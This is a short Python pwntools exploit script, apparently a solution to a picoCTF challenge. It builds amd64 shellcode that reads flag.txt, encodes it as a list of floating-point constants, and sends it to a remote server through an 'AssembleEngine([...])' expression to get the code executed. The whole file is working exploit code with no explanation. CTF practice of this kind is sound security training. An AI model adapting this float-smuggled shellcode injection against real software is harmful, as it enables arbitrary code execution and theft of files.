from pwn import *
context(arch='amd64', os='linux')
r = remote('mercury.picoctf.net', 48700)
shellcode = asm(shellcraft.amd64.linux.cat2('flag.txt'))
shellcode += b'\x90' * ((8 - (len(shellcode)%8)) % 8)
payload = ''
entries = []
for i in range(0, len(shellcode), 8):
    #print(shellcode[i:i+8])
    entries.append(str(struct.unpack('<d', shellcode[i:i+8])[0]))
payload = ','.join(entries)
c = 'AssembleEngine([' + payload + '])'
l = len(c)
r.sendline(str(l).encode())
r.sendline(c.encode()) 
r.interactive()
